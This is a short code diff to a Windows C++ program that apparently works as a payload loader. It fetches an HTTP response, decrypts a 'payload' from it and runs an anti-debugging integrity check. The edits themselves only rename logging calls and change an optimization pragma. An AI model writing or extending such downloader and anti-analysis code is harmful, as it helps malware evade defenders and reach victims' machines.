@@ -9,9 +9,8 @@
 
 #ifndef _DEBUG
 // IF RELEASE
-#pragma optimize("x", on)
+#pragma optimize("gity", on)
 #endif // !_DEBUG
-
 
 int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
     FILE* cmdOUT = Logging::InitConsole();
@@ -37,7 +36,7 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 
     // Error handling
     if (response.length() <= 0) {
-        Logging::mRed("[Error] Empty HTTP response from server");
+        Logging::Red("[Error] Empty HTTP response from server");
         exit(-6);
     };
 
@@ -46,7 +45,7 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
     vector<BYTE>* dPayload = payloadManager->GetDecryptedPayload(response);
 
 
-    Logging::mGreen("First 3 bytes of decrypted payload: " + dPayload->data()[0] + dPayload->data()[1] + dPayload->data()[2]);
+    Logging::Green("First 3 bytes of decrypted payload: " + dPayload->data()[0] + dPayload->data()[1] + dPayload->data()[2]);
 
 
     antiDbg.KillIfIntegrityCheckFails();
